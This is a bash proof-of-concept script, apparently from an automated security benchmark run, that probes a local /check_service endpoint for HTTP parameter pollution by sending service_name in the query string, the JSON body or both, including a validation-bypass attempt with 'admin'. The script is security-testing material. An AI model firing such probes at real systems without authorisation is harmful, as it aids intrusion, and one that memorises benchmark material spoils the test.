#!/bin/bash
# POC: Demonstrates HTTP Parameter Pollution vulnerability by showing that the /check_service endpoint accepts service_name parameter from both query string and JSON body, enabling parameter confusion attacks.
# Target: ./repo
# Created: 2025-11-07T19:20:11.788Z
# Session: benchmark-XBEN-068-24-mhp8iflp

# HTTP Parameter Pollution POC for /check_service endpoint (Refined)
# Demonstrates parameter confusion: endpoint accepts both query and JSON body parameters
# This creates ambiguity in parameter handling and validation logic

TARGET_URL="http://localhost:8080"
ENDPOINT="/check_service"

echo "========================================="
echo "HTTP Parameter Pollution - Parameter Confusion POC"
echo "Target: ${TARGET_URL}${ENDPOINT}"
echo "========================================="
echo ""

# Test 1: Parameter via JSON body only
echo "[Test 1] Parameter via JSON body only"
echo "Request: POST /check_service"
echo "Body: {\"service_name\": \"mysql\"}"
RESPONSE1=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "mysql"}')
HTTP_CODE1=$(curl -s -w "%{http_code}" -o /dev/null -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "mysql"}')
echo "HTTP Status: $HTTP_CODE1"
echo "Response: $RESPONSE1"
echo ""

# Test 2: Parameter via query string only
echo "[Test 2] Parameter via query string only"
echo "Request: POST /check_service?service_name=mysql"
echo "Body: {}"
RESPONSE2=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}?service_name=mysql" \
  -H "Content-Type: application/json" \
  -d '{}')
HTTP_CODE2=$(curl -s -w "%{http_code}" -o /dev/null -X POST "${TARGET_URL}${ENDPOINT}?service_name=mysql" \
  -H "Content-Type: application/json" \
  -d '{}')
echo "HTTP Status: $HTTP_CODE2"
echo "Response: $RESPONSE2"
echo ""

# Test 3: Parameter in both locations (parameter confusion)
echo "[Test 3] Parameter Pollution - Same parameter in BOTH query and body"
echo "Request: POST /check_service?service_name=postgres"
echo "Body: {\"service_name\": \"mysql\"}"
RESPONSE3=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}?service_name=postgres" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "mysql"}')
HTTP_CODE3=$(curl -s -w "%{http_code}" -o /dev/null -X POST "${TARGET_URL}${ENDPOINT}?service_name=postgres" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "mysql"}')
echo "HTTP Status: $HTTP_CODE3"
echo "Response: $RESPONSE3"
echo "VULNERABILITY: Parameter accepted from both sources with inconsistent handling!"
echo ""

# Test 4: Validation bypass attempt via parameter source ambiguity
echo "[Test 4] Validation Bypass - Using query string to bypass JSON validation"
echo "Request: POST /check_service?service_name=admin"
echo "Body: {\"service_name\": \"\"}"
RESPONSE4=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}?service_name=admin" \
  -H "Content-Type: application/json" \
  -d '{"service_name": ""}')
HTTP_CODE4=$(curl -s -w "%{http_code}" -o /dev/null -X POST "${TARGET_URL}${ENDPOINT}?service_name=admin" \
  -H "Content-Type: application/json" \
  -d '{"service_name": ""}')
echo "HTTP Status: $HTTP_CODE4"
echo "Response: $RESPONSE4"
echo ""

# Test 5: Demonstrate inconsistent behavior across requests
echo "[Test 5] Logic Inconsistency - Different parameter sources lead to different processing"
echo "Request A: POST /check_service (body only)"
curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "mysql"}' -w " (HTTP %{http_code})\n"

echo "Request B: POST /check_service?service_name=mysql (query only)"
curl -s -X POST "${TARGET_URL}${ENDPOINT}?service_name=mysql" \
  -H "Content-Type: application/json" \
  -d '{}' -w " (HTTP %{http_code})\n"

echo "Request C: POST /check_service?service_name=mysql (both, same value)"
curl -s -X POST "${TARGET_URL}${ENDPOINT}?service_name=mysql" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "mysql"}' -w " (HTTP %{http_code})\n"

echo ""
echo "========================================="
echo "VULNERABILITY CONFIRMED:"
echo "✗ Endpoint accepts service_name from both query string AND JSON body"
echo "✗ Parameter source is not validated or restricted"
echo "✗ This enables HTTP Parameter Pollution attacks"
echo "✗ Different validation/processing logic may apply depending on parameter source"
echo "========================================="